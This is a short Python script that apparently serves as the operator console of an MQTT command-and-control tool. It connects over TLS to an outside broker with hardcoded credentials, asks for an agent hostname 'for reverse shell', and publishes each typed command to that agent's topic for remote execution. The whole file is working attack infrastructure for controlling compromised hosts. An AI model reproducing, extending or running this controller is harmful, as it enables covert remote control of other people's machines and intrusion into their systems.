import paho.mqtt.client as mqtt
import threading
import subprocess
import time
import worker
import os

def Output():
	worker.Main()

t1 = threading.Thread(target=Output, args=[])
t1.daemon = True
t1.start()

broker = "appinfolive.com"
port = 8883
username = 'dirtysphynx'
password = 'flatbedgiraffe'
# Set an topic for target to listen
agent = ""
topic = "target/"+agent+"/"

# Set up connection
client = mqtt.Client()
client.tls_set()
client.username_pw_set(username, password)
client.connect(broker, port, 60)

time.sleep(0.5)
client.loop_start()

def choices1():
	print('\nEnter Hostname for reverse shell, enter exit to leave')
	agent = input('Agent Hostname: ')
	print('Enter a command')

	while True:
		command = "\r\n"
		command = input()
		if command == 'exit':
			client.loop_stop()
			client.disconnect()
			print("\nGoodbye\n")
			quit()
		elif command == 'back':
			os.system('clear')
			choices1()
		else:
			client.publish("target/"+agent+"/",payload=command)
choices1()
